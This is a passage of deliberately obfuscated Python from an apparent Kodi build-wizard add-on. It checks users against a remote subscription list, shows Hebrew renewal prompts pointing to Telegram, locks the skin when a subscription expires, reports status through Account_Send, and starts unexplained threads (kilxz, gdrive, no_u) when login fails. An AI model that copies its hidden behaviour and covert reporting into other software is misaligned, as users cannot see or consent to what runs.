                        setS ("set_usersync",'false')#line:891
                except :#line:892
                    O0OO0OO000OO0O0OO =' = (.+?)\n'#line:893
                    OOOOOO0O00O0O0OO0 =re .compile (O0OO0OO000OO0O0OO ).findall (O00OO00OOO0O0OOOO .decode ('utf-8'))[0 ]#line:894
                    setS ("sync_user",OOOOOO0O00O0O0OO0 .replace ('@','').replace (' ',''))#line:895
                    setS ("pass2","true")#line:896
                    if getS ("set_usersync")=='true':#line:897
                     if os .path .exists (translatepath ("special://home/addons/plugin.program.mediasync")):#line:898
                        OOOOO0OO0O0OO000O =xbmcaddon .Addon ('plugin.program.mediasync')#line:899
                        OOOOO0OO0O0OO000O .setSetting ('firebase',OOOOOO0O00O0O0OO0 .replace ('@','').replace (' ',''))#line:900
                        OOOOO0OO0O0OO000O .setSetting ('sync_mod','true')#line:901
                        user_sync ()#line:902
                        setS ("set_usersync",'false')#line:903
            except :#line:905
                pass #line:906
            break #line:907
    OO0OO0O0OO0O00O0O =[]#line:909
    try :#line:910
        O0OOO00OOOOOO0OOO =read_skin ('playback')#line:911
        for OO0OO00OO0OOO0O00 in O0OOO00OOOOOO0OOO :#line:912
            O0000OO0O00O00OO0 =O0OOO00OOOOOO0OOO [OO0OO00OO0OOO0O00 ]#line:913
            OO0OO0O0OO0O00O0O .append ((O0000OO0O00O00OO0 ['name'],O0000OO0O00O00OO0 ['date'],O0000OO0O00O00OO0 ['sync'],O0000OO0O00O00OO0 ['dragon'],O0000OO0O00O00OO0 ['device']))#line:914
    except Exception as OO0O00O00OOO00O0O :#line:915
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (OO0O00O00OOO00O0O ))#line:916
    for OO0OOO000OO000O00 ,OO0OOOOO000O0OO00 ,OOOOOO0O00O0O0OO0 ,O0OO000OO0OO0O0O0 ,OO0O000O00OOO00OO in OO0OO0O0OO0O00O0O :#line:917
        if OO0OOO000OO000O00 .split ()[0 ].lower ()==OOO0O0O0O0OO0000O :#line:919
            O0O0O0O0OO0OOO0O0 =1 #line:920
            setS ("date_user",OO0OOOOO000O0OO00 .replace (' ',''))#line:921
            setS ("device",OO0O000O00OOO00OO .replace (' ',''))#line:922
            setS ("sync_user",OOOOOO0O00O0O0OO0 .replace (' ',''))#line:923
            if '@'in O0OO000OO0OO0O0O0 .replace (' ',''):#line:924
                    setS ("dragon","true")#line:925
            else :#line:926
                    setS ("dragon","false")#line:927
            if getS ("set_usersync")=='true':#line:929
             if os .path .exists (translatepath ("special://home/addons/plugin.program.mediasync")):#line:930
                OOOOO0OO0O0OO000O =xbmcaddon .Addon ('plugin.program.mediasync')#line:931
                OOOOO0OO0O0OO000O .setSetting ('firebase',OOOOOO0O00O0O0OO0 .replace (' ',''))#line:932
                OOOOO0OO0O0OO000O .setSetting ('sync_mod','true')#line:933
                user_sync ()#line:934
                setS ("set_usersync",'false')#line:935
    if O0O0O0O0OO0OOO0O0 ==0 :#line:936
        try :#line:937
            make_setting_file ()#line:938
        except :pass #line:939
        if KODI_VERSION <=18 :#line:940
            O00OOOOO0O0O0O0OO =DIALOG .yesno ("%s"%"בעיה בשם המשתמש","שם המשתמש שהוכנס אינו נכון,","הכנס את שם המשתמש כעת",nolabel ="ביטול",yeslabel ="הכנס שם משתמש")#line:941
        else :#line:942
            O00OOOOO0O0O0O0OO =DIALOG .yesno ("%s"%"בעיה בשם המשתמש","שם המשתמש שהוכנס אינו נכון,",'ביטול',yeslabel ="הכנס שם משתמש")#line:943
        if BUILDNAME =="":#line:945
            LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow',"לקבלת שם משתמש יש לפנות לכתובת הזאת בטלגרם:"),'[COLOR %s]https://t.me/xbmc19[/COLOR]'%COLOR2 )#line:946
            xbmc .executebuiltin ("ActivateWindow(home)")#line:947
        if O00OOOOO0O0O0O0OO :#line:948
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:949
            ADDON .openSettings ()#line:950
            sys .exit ()#line:951
        else :#line:952
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:953
            if BUILDNAME ==" Kodi Premium":#line:954
                O0O0OO0O0OO0000OO =[]#line:955
                O0O0OO0O0OO0000OO .append (Thread (kilxz ))#line:956
                O0O0OO0O0OO0000OO .append (Thread (gdrive ))#line:957
                O0O0OO0O0OO0000OO .append (Thread (no_u ))#line:958
                O0O0OO0O0OO0000OO [0 ].start ()#line:959
                xbmcgui .Dialog ().ok ('Anonymous TV','ללא שם משתמש המערכת לא תתעדכן יותר.')#line:964
                sys .exit ()#line:965
            sys .exit ()#line:966
    else :#line:967
        O000OO0OOOOOOOO0O =getS ("date_user")#line:968
        import datetime #line:969
        if not O000OO0OOOOOOOO0O =='':#line:970
            OO0OOOOO000O0OO00 =O000OO0OOOOOOOO0O .split ('.')#line:971
            O00OOOO0O00000OO0 =datetime .date (int (OO0OOOOO000O0OO00 [2 ]),int (OO0OOOOO000O0OO00 [1 ]),int (OO0OOOOO000O0OO00 [0 ]))#line:972
            if getS ("check_user")=='true':#line:973
              if str (TODAY )>=str (O00OOOO0O00000OO0 ):#line:974
                 setS ("check_user",'false')#line:975
                 if BUILDNAME ==" Kodi Premium":#line:976
                     Account_Send (que (' מנוי הסתיים - התקנה פעילה '),O000OO0OOOOOOOO0O )#line:977
            if str (O00OOOO0O00000OO0 )>str (TODAY ):#line:978
                 setS ("check_user",'true')#line:979
            else :#line:981
                if not xbmc .Player ().isPlaying ():#line:982
                  if BUILDNAME ==" Kodi Premium":#line:983
                    if getS ('dragon')=='true':#line:984
                        contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשלושה חודשים יש לפנות למנהלים')#line:985
                    else :#line:986
                       contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:987
                  else :#line:988
                    if getS ('dragon')=='true':#line:989
                        contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשלושה חודשים נוספים יש לפנות למנהלים')#line:990
                    else :#line:991
                        contact_wiz ('תקופת המנוי הסתיימה, \nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:992
                  if str (MONTH )>=str (O00OOOO0O00000OO0 ):#line:993
                    OOO0OO0OOO0O0O0O0 =os .path .join (translatepath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:994
                    try :#line:995
                        O00O00O0OO00O0O00 =open (OOO0OO0OOO0O0O0O0 ,'r')#line:996
                        O0O000O0O0OOOOO00 =O00O00O0OO00O0O00 .read ()#line:997
                        O00O00O0OO00O0O00 .close ()#line:998
                    except :#line:999
                        O00O00O0OO00O0O00 =open (OOO0OO0OOO0O0O0O0 ,'r',encoding ='utf-8')#line:1000
                        O0O000O0O0OOOOO00 =O00O00O0OO00O0O00 .read ()#line:1001
                        O00O00O0OO00O0O00 .close ()#line:1002
                    OO0000OO0000OOO00 ='<setting id="username" type="bool(.+?)/setting>'#line:1003
                    OO0O00O0O0O000OOO =re .compile (OO0000OO0000OOO00 ).findall (O0O000O0O0OOOOO00 )[0 ]#line:1004
                    if 'false'in OO0O00O0O0O000OOO :#line:1005
                     xbmc .executebuiltin ("Skin.ToggleSetting(username)")#line:1006
                     xbmc .executebuiltin ("ActivateWindow(home)")#line:1007
                     xbmc .executebuiltin ("ReloadSkin()")#line:1008
                     Account_Send (que ('מנוי ננעל'),O000OO0OOOOOOOO0O )#line:1009
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1010
                if BUILDNAME =="":#line:1011
                  Account_Send (que (' מנוי הסתיים - התקנה חדשה'),O000OO0OOOOOOOO0O )#line:1012
                sys .exit ()#line:1013
            if getS ("check_user")=='true':#line:1015
                if str (ONEWEEK )>str (O00OOOO0O00000OO0 ):#line:1016
                 if not xbmc .Player ().isPlaying ():#line:1017
                    O000O000O00000OOO =getS ("show_alert")#line:1018
                    OOOOO000OO0O0O0OO =getS ('nextcleandate')#line:1019
                    if O000O000O00000OOO =='true':#line:1023
                        setS ("show_alert",'false')#line:1024
                        Account_Send (que (' מנוי עומד להסתיים '),O000OO0OOOOOOOO0O )#line:1025
                        if BUILDNAME ==" Kodi Premium":#line:1026
                            if getS ('dragon')=='true':#line:1027
                                contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+O000OO0OOOOOOOO0O +'[/COLOR]'+'\n'+'לחידוש לשלושה חודשים נוספים יש לפנות למנהלים.')#line:1028
                            else :#line:1029
                                contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+O000OO0OOOOOOOO0O +'[/COLOR]'+'\n'+'לחידוש לשנה נוספת יש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n [COLOR red]https://t.me/xbmc19[/COLOR]')#line:1030
                else :#line:1032
                    setS ("show_alert",'true')#line:1033
    return 'ok'#line:1035
def STARTP2 ():#line:1037
    OO00O0O0OOO0000O0 =[]#line:1047
    O00O00O000O00O0OO =0 #line:1048
    OOOO0OOOO0O0OOO00 =(ADDON .getSetting ("pass"))#line:1049
    try :#line:1050
        OOOO0O0O0O00OO0O0 =read_skin ('password')#line:1051
        for O00000OO00O00OO0O in OOOO0O0O0O00OO0O0 :#line:1052
            O00O0O00OOOO00O00 =OOOO0O0O0O00OO0O0 [O00000OO00O00OO0O ]#line:1053
            OO00O0O0OOO0000O0 .append ((O00O0O00OOOO00O00 ['password']))#line:1054
    except Exception as O0OOO00OO00O000O0 :#line:1055
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (O0OOO00OO00O000O0 ))#line:1056
    for O00OOOOOO00O000OO in OO00O0O0OOO0000O0 :#line:1057
        if O00OOOOOO00O000OO .split ()[0 ].lower ()==OOOO0OOOO0O0OOO00 :#line:1059
            O00O00O000O00O0OO =1 #line:1060
    if O00O00O000O00O0OO ==0 :#line:1061
        try :#line:1062
            O00O000OOO00OOO00 =DIALOG .yesno ("%s"%"בעיה בסיסמה","הסיסמה אינה נכונה,","הכנס את הסיסמה כעת",nolabel ="ביטול",yeslabel ="הכנס סיסמה")#line:1063
        except :#line:1064
            O00O000OOO00OOO00 =DIALOG .yesno ("%s"%"בעיה בסיסמה","הסיסמה אינה נכונה,",'ביטול',yeslabel ="הכנס סיסמה")#line:1065
        LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow',"לקבלת סיסמה יש לפנות לכתובת הזאת בטלגרם:"),'[COLOR %s]https://t.me/xbmc19[/COLOR]'%COLOR2 )#line:1067
        if BUILDNAME =="":#line:1068
            xbmc .executebuiltin ("ActivateWindow(home)")#line:1069
        if O00O000OOO00OOO00 :#line:1070
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1071
            O0000O00O000OO0O0 =[]#line:1072
            O0000O00O000OO0O0 .append (Thread (tryinstall ))#line:1073
            O0000O00O000OO0O0 [0 ].start ()#line:1075
            ADDON .openSettings ()#line:1077
            sys .exit ()#line:1078
        else :#line:1080
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1081
            sys .exit ()#line:1082
    return 'ok'#line:1084
def STARTP3 ():#line:1086
    OO00000OOOOO0OOO0 =0 #line:1087
    OOO0OOO000OOOOOO0 =(ADDON .getSetting ("user"))#line:1088
    O0OOO00O0OOOOO000 =[]#line:1089
    O0O0OO000OO0OOO0O =read_skin ('playback')#line:1090
    for O00O0O00O0OO0000O in O0O0OO000OO0OOO0O :#line:1091
        OOO0O0O0OO0O00000 =O0O0OO000OO0OOO0O [O00O0O00O0OO0000O ]#line:1092
        O0OOO00O0OOOOO000 .append ((OOO0O0O0OO0O00000 ['name'],OOO0O0O0OO0O00000 ['date'],OOO0O0O0OO0O00000 ['sync'],OOO0O0O0OO0O00000 ['dragon'],OOO0O0O0OO0O00000 ['device']))#line:1093
    for O000OOOO0O00O000O ,O0O00O0OOOOOO0OO0 ,O0O0O0O0O000000OO ,O0000O0OO0OO00000 ,OOOO00O0OO0OOO00O in O0OOO00O0OOOOO000 :#line:1094
        if O000OOOO0O00O000O ==OOO0OOO000OOOOOO0 :#line:1095
            OO00000OOOOO0OOO0 =1 #line:1096
            setS ("date_user",O0O00O0OOOOOO0OO0 .replace (' ',''))#line:1097
            setS ("device",OOOO00O0OO0OOO00O .replace (' ',''))#line:1098
            setS ("sync_user",O0O0O0O0O000000OO .replace (' ',''))#line:1099
            if '@'in O0000O0OO0OO00000 .replace (' ',''):#line:1100
                    setS ("dragon","true")#line:1101
            else :#line:1102
                    setS ("dragon","false")#line:1103
            if getS ("set_usersync")=='true':#line:1105
             if os .path .exists (translatepath ("special://home/addons/plugin.program.mediasync")):#line:1106
                OO000O000O00OO00O =xbmcaddon .Addon ('plugin.program.mediasync')#line:1107
                OO000O000O00OO00O .setSetting ('firebase',O0O0O0O0O000000OO .replace (' ',''))#line:1108
                OO000O000O00OO00O .setSetting ('sync_mod','true')#line:1109
                user_sync ()#line:1110
                setS ("set_usersync",'false')#line:1111
    if OO00000OOOOO0OOO0 ==0 :#line:1112
        try :#line:1113
            make_setting_file ()#line:1114
        except :pass #line:1115
        if KODI_VERSION <=18 :#line:1116
            OO0OO0OO00OO00OO0 =DIALOG .yesno ("%s"%"בעיה בשם המשתמש","שם המשתמש שהוכנס אינו נכון,","הכנס את שם המשתמש כעת",nolabel ="ביטול",yeslabel ="הכנס שם משתמש")#line:1117
        else :#line:1118
            OO0OO0OO00OO00OO0 =DIALOG .yesno ("%s"%"בעיה בשם המשתמש","שם המשתמש שהוכנס אינו נכון,",'ביטול',yeslabel ="הכנס שם משתמש")#line:1119
        if BUILDNAME =="":#line:1121
            LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow',"לקבלת שם משתמש יש לפנות לכתובת הזאת בטלגרם:"),'[COLOR %s]https://t.me/xbmc19[/COLOR]'%COLOR2 )#line:1122
            xbmc .executebuiltin ("ActivateWindow(home)")#line:1123
        if OO0OO0OO00OO00OO0 :#line:1124
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1125
            ADDON .openSettings ()#line:1126
            sys .exit ()#line:1127
        else :#line:1128
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1129
            sys .exit ()#line:1130
            if BUILDNAME ==" Kodi Premium":#line:1131
                OO0000O000OOO00OO =[]#line:1132
                OO0000O000OOO00OO .append (Thread (kilxz ))#line:1133
                OO0000O000OOO00OO .append (Thread (gdrive ))#line:1134
                OO0000O000OOO00OO .append (Thread (no_u ))#line:1135
                OO0000O000OOO00OO [0 ].start ()#line:1136
                xbmcgui .Dialog ().ok ('Anonymous TV','ללא שם משתמש המערכת לא תתעדכן יותר.')#line:1141
            sys .exit ()#line:1142
    else :#line:1143
        OOOOO000O0OOOOO00 =getS ("date_user")#line:1144
        import datetime #line:1145
        if not OOOOO000O0OOOOO00 =='':#line:1146
            O0O00O0OOOOOO0OO0 =OOOOO000O0OOOOO00 .split ('.')#line:1147
            OO0O0O00OO0O0O0O0 =datetime .date (int (O0O00O0OOOOOO0OO0 [2 ]),int (O0O00O0OOOOOO0OO0 [1 ]),int (O0O00O0OOOOOO0OO0 [0 ]))#line:1148
            if getS ("check_user")=='true':#line:1149
              if str (TODAY )>=str (OO0O0O00OO0O0O0O0 ):#line:1150
                 setS ("check_user",'false')#line:1151
                 if BUILDNAME ==" Kodi Premium":#line:1152
                     Account_Send (que (' מנוי הסתיים - התקנה פעילה '),OOOOO000O0OOOOO00 )#line:1153
            if str (OO0O0O00OO0O0O0O0 )>str (TODAY ):#line:1154
                 setS ("check_user",'true')#line:1155
            else :#line:1157
                if not xbmc .Player ().isPlaying ():#line:1158
                  if BUILDNAME ==" Kodi Premium":#line:1159
                    if getS ('dragon')=='true':#line:1160
                        contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשלושה חודשים יש לפנות למנהלים')#line:1161
                    else :#line:1162
                       contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:1163
                  else :#line:1164
                    if getS ('dragon')=='true':#line:1165
                        contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשלושה חודשים נוספים יש לפנות למנהלים')#line:1166
                    else :#line:1167
                        contact_wiz ('תקופת המנוי הסתיימה, \nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:1168
                  if str (MONTH )>=str (OO0O0O00OO0O0O0O0 ):#line:1169
                    O00OOOO0OOOO0O00O =os .path .join (translatepath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:1170
                    try :#line:1171
                        OO0OOO0OOOO0O00O0 =open (O00OOOO0OOOO0O00O ,'r')#line:1172
                        O0000O00OOO0OO00O =OO0OOO0OOOO0O00O0 .read ()#line:1173
                        OO0OOO0OOOO0O00O0 .close ()#line:1174
                    except :#line:1175
                        OO0OOO0OOOO0O00O0 =open (O00OOOO0OOOO0O00O ,'r',encoding ='utf-8')#line:1176
                        O0000O00OOO0OO00O =OO0OOO0OOOO0O00O0 .read ()#line:1177
                        OO0OOO0OOOO0O00O0 .close ()#line:1178
                    OO0O000O000OO0OO0 ='<setting id="username" type="bool(.+?)/setting>'#line:1179
                    OOO00OO0000000OOO =re .compile (OO0O000O000OO0OO0 ).findall (O0000O00OOO0OO00O )[0 ]#line:1180
                    if 'false'in OOO00OO0000000OOO :#line:1181
                     xbmc .executebuiltin ("Skin.ToggleSetting(username)")#line:1182
                     xbmc .executebuiltin ("ActivateWindow(home)")#line:1183
                     xbmc .executebuiltin ("ReloadSkin()")#line:1184
                     Account_Send (que ('מנוי ננעל'),OOOOO000O0OOOOO00 )#line:1185
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1186
                if BUILDNAME =="":#line:1187
                  Account_Send (que (' מנוי הסתיים - התקנה חדשה'),OOOOO000O0OOOOO00 )#line:1188
                sys .exit ()#line:1189
            if getS ("check_user")=='true':#line:1191
                if str (ONEWEEK )>str (OO0O0O00OO0O0O0O0 ):#line:1192
                 if not xbmc .Player ().isPlaying ():#line:1193
                    OO000OO00O00OOOO0 =getS ("show_alert")#line:1194
                    OO0OO00O00000OOO0 =getS ('nextcleandate')#line:1195
                    if OO000OO00O00OOOO0 =='true':#line:1198
                        setS ("show_alert",'false')#line:1199
                        Account_Send (que (' מנוי עומד להסתיים '),OOOOO000O0OOOOO00 )#line:1200
                        if BUILDNAME ==" Kodi Premium":#line:1201
                            if getS ('dragon')=='true':#line:1202
                                contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+OOOOO000O0OOOOO00 +'[/COLOR]'+'\n'+'לחידוש לשלושה חודשים נוספים יש לפנות למנהלים.')#line:1203
                            else :#line:1204
                                contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+OOOOO000O0OOOOO00 +'[/COLOR]'+'\n'+'לחידוש לשנה נוספת יש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n [COLOR red]https://t.me/xbmc19[/COLOR]')#line:1205
                else :#line:1206
                    setS ("show_alert",'true')#line:1207
    return 'ok'#line:1208
def STARTP4 ():#line:1209
    OOO000O0OOOOOOO0O =0 #line:1210
    OO00O0000OO0O0OOO ='https://digit.seedhost.eu/kodi/wizard/txt/user.json'#line:1211
    O000OO000OO00OO0O ='ami'#line:1212
    O0O000O0OO0000O0O =urlopen (OO00O0000OO0O0OOO )#line:1213
    O0OO00OOO000OO00O =O0O000O0OO0000O0O .readlines ()#line:1214
    for O00O0O0O0000OOOOO in O0OO00OOO000OO00O :#line:1215
        OOOOOOOOOOO00O00O =json .loads (O00O0O0O0000OOOOO )#line:1216
        for O0000OO0OO000O000 in OOOOOOOOOOO00O00O :#line:1217
            if OOOOOOOOOOO00O00O ['name']==O000OO000OO00OO0O :#line:1218
                OOO000O0OOOOOOO0O =1 #line:1219
                OO000OO0O00O0OO0O =OOOOOOOOOOO00O00O ['date']#line:1220
                O00O00OOOO0OOO000 =OOOOOOOOOOO00O00O ['sync']#line:1221
                OO0O0OO00O000OO0O =OOOOOOOOOOO00O00O ['dragon']#line:1222
                OO0OOO0O00000O0O0 =OOOOOOOOOOO00O00O ['device']#line:1223
                setS ("date_user",OO000OO0O00O0OO0O .replace (' ',''))#line:1224
                setS ("device",OO0OOO0O00000O0O0 .replace (' ',''))#line:1225
                if '@'in OO0O0OO00O000OO0O .replace (' ',''):#line:1226
                        setS ("dragon","true")#line:1227
                else :#line:1228
                        setS ("dragon","false")#line:1229
                if 1 :#line:1230
                 if os .path .exists (translatepath ("special://home/addons/plugin.program.mediasync")):#line:1231
                    OO0000OOO00OOOOO0 =xbmcaddon .Addon ('plugin.program.mediasync')#line:1232
                    OO0000OOO00OOOOO0 .setSetting ('firebase',O00O00OOOO0OOO000 .replace (' ',''))#line:1233
                    OO0000OOO00OOOOO0 .setSetting ('sync_mod','true')#line:1234
                    user_sync ()#line:1235
                    setS ("set_usersync",'false')#line:1236
def checkWizard (OO0OO0OO00OO0O0O0 ):#line:1238
    if not workingURL (WIZARDFILE )==True :return False #line:1239
    O00OOO000OOOO0O0O =openURL (WIZARDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1240
    OOOO0OO0000O0O0OO =re .compile ('id="%s".+?ersion="(.+?)".+?ip="(.+?)"'%ADDON_ID ).findall (O00OOO000OOOO0O0O )#line:1241
    if len (OOOO0OO0000O0O0OO )>0 :#line:1242
        for O00O00O0O00O0O00O ,OOO0OO0OOOOOOOO00 in OOOO0OO0000O0O0OO :#line:1243
            if OO0OO0OO00OO0O0O0 =='version':return O00O00O0O00O0O00O #line:1244
            elif OO0OO0OO00OO0O0O0 =='zip':return OOO0OO0OOOOOOOO00 #line:1245
            elif OO0OO0OO00OO0O0O0 =='all':return ADDON_ID ,O00O00O0O00O0O00O ,OOO0OO0OOOOOOOO00 #line:1246
    else :return False #line:1247
def buildCount (ver =None ):#line:1249
    OO00OOO0O000O0O0O =openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:1250
    O00O00OO00000O000 =re .compile ('name="(.+?)".+?odi="(.+?)".+?dult="(.+?)"').findall (OO00OOO0O000O0O0O )#line:1251
    OOO00000O0OO0OOO0 =0 ;OO00O00OOO0OOOO0O =0 ;O00OO00O00OO0OOOO =0 ;OO0O0OO00OO000OO0 =0 ;OO000O0OOO0OOO000 =0 ;OOO00OOO000OOO0O0 =0 ;O00000O00O0OOOOOO =0 #line:1252
    if len (O00O00OO00000O000 )>0 :#line:1253
        for O000O0O0000OO0OOO ,O0OOO00OO0OOOO0OO ,O0000O0O0OOO00O0O in O00O00OO00000O000 :#line:1254
            if not SHOWADULT =='true'and O0000O0O0OOO00O0O .lower ()=='yes':OOO00OOO000OOO0O0 +=1 ;O00000O00O0OOOOOO +=1 ;continue #line:1255
            if not DEVELOPER =='true'and strTest (O000O0O0000OO0OOO ):OOO00OOO000OOO0O0 +=1 ;continue #line:1256
            O0OOO00OO0OOOO0OO =int (float (O0OOO00OO0OOOO0OO ))#line:1257
            OOO00000O0OO0OOO0 +=1 #line:1258
            if O0OOO00OO0OOOO0OO ==18 :OO000O0OOO0OOO000 +=1 #line:1259
            elif O0OOO00OO0OOOO0OO ==17 :OO0O0OO00OO000OO0 +=1 #line:1260
            elif O0OOO00OO0OOOO0OO ==16 :O00OO00O00OO0OOOO +=1 #line:1261
            elif O0OOO00OO0OOOO0OO <=15 :OO00O00OOO0OOOO0O +=1 #line:1262
    return OOO00000O0OO0OOO0 ,OO00O00OOO0OOOO0O ,O00OO00O00OO0OOOO ,OO0O0OO00OO000OO0 ,OO000O0OOO0OOO000 ,O00000O00O0OOOOOO ,OOO00OOO000OOO0O0 #line:1263
def strTest (OO0OOO0000O00000O ):#line:1265
    O0OO00OO000OO00OO =(OO0OOO0000O00000O .lower ()).split (' ')#line:1266
    if 'test'in O0OO00OO000OO00OO :return True #line:1267
    else :return False #line:1268
def themeCount (O000O00O0000O0OOO ,count =True ):#line:1270
    O0OO0000O0O0O0O0O =checkBuild (O000O00O0000O0OOO ,'theme')#line:1271
    if O0OO0000O0O0O0O0O =='http://':return False #line:1272
    OO0000OOOO0000000 =openURL (O0OO0000O0O0O0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1273
    O0O0O00O0OOOOOOO0 =re .compile ('name="(.+?)".+?dult="(.+?)"').findall (OO0000OOOO0000000 )#line:1274
    if len (O0O0O00O0OOOOOOO0 )==0 :return False #line:1275
    O000OOOO0000O0O0O =[]#line:1276
    for OOOO0OO00O0OOOO0O ,O000O00O0OOOOO000 in O0O0O00O0OOOOOOO0 :#line:1277
        if not SHOWADULT =='true'and O000O00O0OOOOO000 .lower ()=='yes':continue #line:1278
        O000OOOO0000O0O0O .append (OOOO0OO00O0OOOO0O )#line:1279
    if len (O000OOOO0000O0O0O )>0 :#line:1280
        if count ==True :return len (O000OOOO0000O0O0O )#line:1281
        else :return O000OOOO0000O0O0O #line:1282
    else :return False #line:1283
def thirdParty (url =None ):#line:1285
    if url ==None :return #line:1286
    O0OOO0OO0O0OOOO0O =openURL (url ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1287
    OO0OO00O0O0OOOO0O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?odi="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOO0OO0O0OOOO0O )#line:1288
    O0OOO00O0O0OOOOO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OOO0OO0O0OOOO0O )#line:1289
    if len (OO0OO00O0O0OOOO0O )>0 :#line:1290
        return True ,OO0OO00O0O0OOOO0O #line:1291
    elif len (O0OOO00O0O0OOOOO0 )>0 :#line:1292
        return False ,O0OOO00O0O0OOOOO0 #line:1293
    else :#line:1294
        return False ,[]#line:1295
def workingURL (O0OOO0O0O00000OO0 ):#line:1301
    if O0OOO0O0O00000OO0 in ['http://','https://','']:return False #line:1302
    O0O0O000OO0000OOO =0 ;O0O0OOO0O0OO00O00 =''#line:1303
    while O0O0O000OO0000OOO <3 :#line:1304
        O0O0O000OO0000OOO +=1 #line:1305
        try :#line:1306
            O0OOO0OOOOOO0O000 =Request (O0OOO0O0O00000OO0 )#line:1307
            O0OOO0OOOOOO0O000 .add_header ('User-Agent',USER_AGENT )#line:1308
            OO00000OOO0O000O0 =urlopen (O0OOO0OOOOOO0O000 )#line:1309
            OO00000OOO0O000O0 .close ()#line:1310
            O0O0OOO0O0OO00O00 =True #line:1311
            break #line:1312
        except Exception as OO0OOO0O0O0OO0O00 :#line:1313
            O0O0OOO0O0OO00O00 =str (OO0OOO0O0O0OO0O00 )#line:1314
            log ("Working Url Error: %s [%s]"%(OO0OOO0O0O0OO0O00 ,O0OOO0O0O00000OO0 ))#line:1315
            xbmc .sleep (500 )#line:1316
    return O0O0OOO0O0OO00O00 #line:1317
def openURL (O0OOOO0000O00O00O ):#line:1319
    O000OOOO0O0OO0O0O =Request (O0OOOO0000O00O00O )#line:1320
    O000OOOO0O0OO0O0O .add_header ('User-Agent',USER_AGENT )#line:1321
    OO0OOOOO0O0O0OO00 =urlopen (O000OOOO0O0OO0O0O )#line:1322
    O0OO0OOOO00OOO0O0 =OO0OOOOO0O0O0OO00 .read ()#line:1323
    OO0OOOOO0O0O0OO00 .close ()#line:1324
    return O0OO0OOOO00OOO0O0 .decode ('utf-8')#line:1326
def getKeyboard (default ="",heading ="",hidden =False ):#line:1331
    OOO000OOO0O0OOO0O =xbmc .Keyboard (default ,heading ,hidden )#line:1332
    OOO000OOO0O0OOO0O .doModal ()#line:1333
    if OOO000OOO0O0OOO0O .isConfirmed ():#line:1334
        return unicode (OOO000OOO0O0OOO0O .getText (),"utf-8")#line:1335
    return default #line:1336
def getSize (OO0O000O000O0OOOO ,total =0 ):#line:1338
    for O000O0000000000OO ,OOO0O00OOO0OO0O0O ,O0000OOO0O0O0OOOO in os .walk (OO0O000O000O0OOOO ):#line:1339
        for OO00OO000O0O000OO in O0000OOO0O0O0OOOO :#line:1340
            OOOOOO0O0O0O00O0O =os .path .join (O000O0000000000OO ,OO00OO000O0O000OO )#line:1341
            total +=os .path .getsize (OOOOOO0O0O0O00O0O )#line:1342
    return total #line:1343
def convertSize (O00OOO0OO00O00OOO ,suffix ='B'):#line:1345
    for O0O0O0000OOOO0000 in ['','K','M','G']:#line:1346
        if abs (O00OOO0OO00O00OOO )<1024.0 :#line:1347
            return "%3.02f %s%s"%(O00OOO0OO00O00OOO ,O0O0O0000OOOO0000 ,suffix )#line:1348
        O00OOO0OO00O00OOO /=1024.0 #line:1349
    return "%.02f %s%s"%(O00OOO0OO00O00OOO ,'G',suffix )#line:1350
def getCacheSize ():#line:1352
    OO0O0OO0OO0OOO000 =os .path .join (PROFILE ,'addon_data')#line:1353
